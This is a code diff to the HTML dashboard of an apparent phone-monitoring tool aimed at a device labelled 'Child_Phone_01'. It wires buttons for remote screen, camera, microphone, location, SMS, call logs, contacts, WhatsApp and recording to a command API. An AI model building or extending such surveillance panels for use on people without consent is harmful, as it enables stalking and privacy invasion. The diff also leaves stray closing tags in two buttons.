@@ -67,29 +67,16 @@
         .control-btn i { font-size: 1.2rem; margin-bottom: 6px; }
         .control-btn span { font-size: 0.6rem; text-align: center; color: #bbb; }
 
-        /* Refresh Button Styling */
         .refresh-area {
-            display: flex;
-            justify-content: center;
-            border-top: 1px solid var(--glass-border);
-            padding-top: 15px;
+            display: flex; justify-content: center;
+            border-top: 1px solid var(--glass-border); padding-top: 15px;
         }
         .btn-refresh {
-            background: #1a1a1a;
-            color: var(--accent);
-            border: 1px solid var(--accent);
-            padding: 10px 25px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 0.8rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            transition: 0.3s;
+            background: #1a1a1a; color: var(--accent);
+            border: 1px solid var(--accent); padding: 10px 25px;
+            border-radius: 20px; cursor: pointer; font-size: 0.8rem;
+            display: flex; align-items: center; gap: 10px; transition: 0.3s;
         }
-        .btn-refresh:active { transform: scale(0.95); }
-        .fa-spin-custom { animation: fa-spin 1s infinite linear; }
-
         .fa-whatsapp { color: #25D366; } .fa-instagram { color: #E1306C; } .fa-location-dot { color: #ff4444; }
     </style>
 </head>
@@ -130,24 +117,24 @@
         </div>
 
         <div class="controls-grid">
-            <a href="view_screen.html" class="control-btn"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></a>
-            <a href="view_camera.html" class="control-btn"><i class="fa-solid fa-camera"></i><span>Camera</span></a>
-            <a href="view_audio.html" class="control-btn"><i class="fa-solid fa-microphone"></i><span>Audio</span></a>
-            <a href="view_location.html" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></a>
-            <a href="view_gallery.html" class="control-btn"><i class="fa-solid fa-images"></i><span>Gallery</span></a>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-regular fa-message"></i><span>Notify</span></a>
+            <div class="control-btn" onclick="openPage('view_screen.html', 'screen')"><i class="fa-solid fa-mobile-screen"></i><span>Screen</span></div>
+            <div class="control-btn" onclick="openPage('view_camera.html', 'camera')"><i class="fa-solid fa-camera"></i><span>Camera</span></div>
+            <div class="control-btn" onclick="openPage('view_audio.html', 'audio')"><i class="fa-solid fa-microphone"></i><span>Audio</span></div>
+            <div class="control-btn" onclick="openPage('view_location.html', 'location')"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
+            <div class="control-btn" onclick="openPage('view_gallery.html', 'gallery')"><i class="fa-solid fa-images"></i><span>Gallery</span></div>
+            <div class="control-btn" onclick="openPage('view_notifications.html', 'notifications')"><i class="fa-regular fa-message"></i><span>Notify</span></div>
             
             <div class="control-btn" id="soundBtn" onclick="cycleSoundMode()">
                 <i class="fa-solid fa-bell" id="soundIcon"></i><span id="soundText">Sound</span>
             </div>
 
             <div class="control-btn" onclick="sendCommand('rec_start')"><i class="fa-solid fa-circle-dot"></i><span>Rec</span></div>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></a>
-            <a href="view_notifications.html" class="control-btn"><i class="fa-brands fa-instagram"></i><span>Instagram</span></a>
-            <a href="view_call_logs.html" class="control-btn"><i class="fa-solid fa-phone"></i><span>Calls</span></a>
-            <a href="view_contacts.html" class="control-btn"><i class="fa-solid fa-address-book"></i><span>Contacts</span></a>
-            <a href="view_sms.html" class="control-btn"><i class="fa-solid fa-comments"></i><span>SMS</span></a>
-            <a href="view_apps.html" class="control-btn"><i class="fa-brands fa-google-play"></i><span>Apps</span></a>
+            <div class="control-btn" onclick="openPage('view_notifications.html', 'whatsapp')"><i class="fa-brands fa-whatsapp"></i><span>WhatsApp</span></div>
+            <div class="control-btn" onclick="openPage('view_notifications.html', 'instagram')"><i class="fa-brands fa-instagram"></i><span>Instagram</span></div>
+            <div class="control-btn" onclick="openPage('view_call_logs.html', 'calls')"><i class="fa-solid fa-phone"></i><span>Calls</span></div>
+            <div class="control-btn" onclick="openPage('view_contacts.html', 'contacts')"><i class="fa-solid fa-address-book"></i><span>Contacts</span></div>
+            <div class="control-btn" onclick="openPage('view_sms.html', 'sms')"><i class="fa-solid fa-comments"></i><span>SMS</span></a></div>
+            <div class="control-btn" onclick="openPage('view_apps.html', 'apps')"><i class="fa-brands fa-google-play"></i><span>Apps</span></a></div>
         </div>
 
         <div class="refresh-area">
@@ -158,9 +145,20 @@
     </div>
 
     <script>
-        // --- REAL-TIME DATA FETCHING ---
+        const DEVICE_ID = 'Child_Phone_01';
+
+        // --- Naya function: Command bhej kar page kholna ---
+        function openPage(url, cmd) {
+            // Pehle server ko command bhejo
+            sendCommand(cmd);
+            // 500ms intezaar karke page kholo
+            setTimeout(() => {
+                window.location.href = url;
+            }, 500);
+        }
+
         function updateDashboard() {
-            fetch('/api/device-status/Child_Phone_01')
+            fetch(`/api/device-status/${DEVICE_ID}`)
                 .then(res => res.json())
                 .then(data => {
                     document.getElementById('deviceName').innerText = data.model || "Unknown Device";
@@ -187,20 +185,16 @@
                 .catch(err => console.log("Waiting for server..."));
         }
 
-        // --- NEW: Manual Refresh Logic ---
         function manualRefresh() {
             const icon = document.getElementById('refreshIcon');
-            icon.classList.add('fa-spin'); // Start spinning
-            
-            updateDashboard(); // Fetch data immediately
-            
-            setTimeout(() => {
-                icon.classList.remove('fa-spin'); // Stop spinning after 1 second
-            }, 1000);
+            icon.classList.add('fa-spin');
+            updateDashboard();
+            setTimeout(() => { icon.classList.remove('fa-spin'); }, 1000);
         }
 
         setInterval(updateDashboard, 3000);
 
+        let currentMode = 0;
         function cycleSoundMode() {
             const icon = document.getElementById('soundIcon');
             const text = document.getElementById('soundText');
@@ -211,10 +205,11 @@
         }
 
         function sendCommand(action) {
+            console.log("Sending Command:", action);
             fetch('/api/send-command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: 'Child_Phone_01', command: action })
+                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
             });
         }
     </script>
